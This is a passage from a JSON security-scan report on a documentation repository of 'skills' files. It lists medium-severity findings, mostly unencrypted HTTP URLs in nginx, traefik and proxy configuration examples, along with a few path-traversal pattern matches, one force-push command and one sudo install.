        "evidence": "- MiniSat: http://minisat.se/",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/formal/sat-solving-strategies.md",
        "line_number": 778,
        "issue": "Unencrypted HTTP",
        "evidence": "- SAT Competition: http://www.satcompetition.org/",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/collaboration/codetour-guided-walkthroughs.md",
        "line_number": 210,
        "issue": "Path traversal pattern",
        "evidence": "print(f\"  Description: {step['description'][:100]}...\\n\")",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/collaboration/github/github-pull-requests.md",
        "line_number": 580,
        "issue": "Force flag usage",
        "evidence": "git push --force origin feature/auth",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/mobile/react-native-navigation.md",
        "line_number": 226,
        "issue": "Path traversal pattern",
        "evidence": "import { RootStackNavigation, ProfileRouteProp } from '../types/navigation';",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/mobile/react-native-setup.md",
        "line_number": 69,
        "issue": "Privilege escalation",
        "evidence": "- **CocoaPods**: `sudo gem install cocoapods`",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/elegant-design/foundation/typography.md",
        "line_number": 290,
        "issue": "Path traversal pattern",
        "evidence": "src: '../public/fonts/jetbrains-mono.woff2',",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/cache-control.md",
        "line_number": 172,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/traefik-configuration.md",
        "line_number": 296,
        "issue": "Unencrypted HTTP",
        "evidence": "- url: \"http://app1:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/traefik-configuration.md",
        "line_number": 297,
        "issue": "Unencrypted HTTP",
        "evidence": "- url: \"http://app2:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/traefik-configuration.md",
        "line_number": 298,
        "issue": "Unencrypted HTTP",
        "evidence": "- url: \"http://app3:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/traefik-configuration.md",
        "line_number": 308,
        "issue": "Unencrypted HTTP",
        "evidence": "- url: \"http://app1:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/traefik-configuration.md",
        "line_number": 309,
        "issue": "Unencrypted HTTP",
        "evidence": "- url: \"http://app2:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/traefik-configuration.md",
        "line_number": 310,
        "issue": "Unencrypted HTTP",
        "evidence": "- url: \"http://app3:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/traefik-configuration.md",
        "line_number": 324,
        "issue": "Unencrypted HTTP",
        "evidence": "- url: \"http://app1:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/traefik-configuration.md",
        "line_number": 325,
        "issue": "Unencrypted HTTP",
        "evidence": "- url: \"http://app2:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 72,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 112,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 174,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 203,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 253,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 274,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 280,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://websocket_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 479,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://app_backend/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 500,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://app_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 538,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 544,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 550,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 574,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 583,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 606,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 641,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://backend1.internal:8080/health",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 102,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 134,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 173,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://api_backend/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 178,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://admin_backend/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 185,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://web_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 267,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://backend1:8080\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 268,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://backend2:8080\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 269,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://backend3:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 490,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 506,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 527,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://websocket_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 546,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 561,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 608,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 100,
        "issue": "Unencrypted HTTP",
        "evidence": "'http://api.example.com/data',",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 102,
        "issue": "Unencrypted HTTP",
        "evidence": "'http': 'http://user:pass@proxy.corp.com:8080',",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 103,
        "issue": "Unencrypted HTTP",
        "evidence": "'https': 'http://user:pass@proxy.corp.com:8080'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 114,
        "issue": "Unencrypted HTTP",
        "evidence": "'http': f'http://{os.environ[\"PROXY_HOST\"]}:{os.environ[\"PROXY_PORT\"]}',",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 115,
        "issue": "Unencrypted HTTP",
        "evidence": "'https': f'http://{os.environ[\"PROXY_HOST\"]}:{os.environ[\"PROXY_PORT\"]}'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 121,
        "issue": "Unencrypted HTTP",
        "evidence": "'http://api.example.com/data',",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 145,
        "issue": "Unencrypted HTTP",
        "evidence": "response = requests.get('http://api.example.com/data', proxies=proxies)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 158,
        "issue": "Unencrypted HTTP",
        "evidence": "response = requests.get('http://api.example.com/data', proxies=proxies)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 412,
        "issue": "Unencrypted HTTP",
        "evidence": "export http_proxy=\"http://proxy.example.com:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 413,
        "issue": "Unencrypted HTTP",
        "evidence": "export https_proxy=\"http://proxy.example.com:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 417,
        "issue": "Unencrypted HTTP",
        "evidence": "export http_proxy=\"http://user:pass@proxy.example.com:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 418,
        "issue": "Unencrypted HTTP",
        "evidence": "export https_proxy=\"http://user:pass@proxy.example.com:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 428,
        "issue": "Unencrypted HTTP",
        "evidence": "git config --global http.proxy http://proxy.example.com:8080",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 429,
        "issue": "Unencrypted HTTP",
        "evidence": "git config --global https.proxy http://proxy.example.com:8080",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 447,
        "issue": "Unencrypted HTTP",
        "evidence": "\"httpProxy\": \"http://proxy.example.com:8080\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 448,
        "issue": "Unencrypted HTTP",
        "evidence": "\"httpsProxy\": \"http://proxy.example.com:8080\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 510,
        "issue": "Unencrypted HTTP",
        "evidence": "'http://httpbin.org/ip',",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 518,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy = \"http://proxy.example.com:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 546,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy = f\"http://{quote(username)}:{quote(password)}@proxy.example.com:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 563,
        "issue": "Unencrypted HTTP",
        "evidence": "proxies={'https': 'http://proxy.example.com:8080'},",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 584,
        "issue": "Unencrypted HTTP",
        "evidence": "session.mount('http://', adapter)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 588,
        "issue": "Unencrypted HTTP",
        "evidence": "'http': 'http://proxy.example.com:8080',",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 589,
        "issue": "Unencrypted HTTP",
        "evidence": "'https': 'http://proxy.example.com:8080'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nats-messaging.md",
        "line_number": 64,
        "issue": "Unencrypted HTTP",
        "evidence": "requests.post('http://service-b/webhook', json=event)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nats-messaging.md",
        "line_number": 65,
        "issue": "Unencrypted HTTP",
        "evidence": "requests.post('http://service-c/webhook', json=event)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nats-messaging.md",
        "line_number": 66,
        "issue": "Unencrypted HTTP",
        "evidence": "requests.post('http://service-d/webhook', json=event)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 718,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 838,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://api_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 852,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 887,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 908,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend_v1;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 913,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend_v2;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 917,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend_default;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 941,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1054,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1122,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1128,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1133,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend/v1/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1141,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://$backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1149,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1178,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1199,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1222,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://streaming_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1231,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1257,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1262,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_redirect http://backend/ http://$host/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1461,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1500,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1660,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://admin_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1840,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1930,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://$backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2147,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2152,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://auth_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2216,
        "issue": "Path traversal pattern",
        "evidence": "\u2502   \u251c\u2500\u2500 example.com.conf -> ../sites-available/example.com.conf",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2217,
        "issue": "Path traversal pattern",
        "evidence": "\u2502   \u2514\u2500\u2500 api.example.com.conf -> ../sites-available/api.example.com.conf",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2271,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2345,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2353,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2364,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2369,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2378,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2383,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2416,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2443,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://$backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2450,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://$backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2470,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://backend:8080/",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2535,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://websocket_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2719,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://api_v1/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
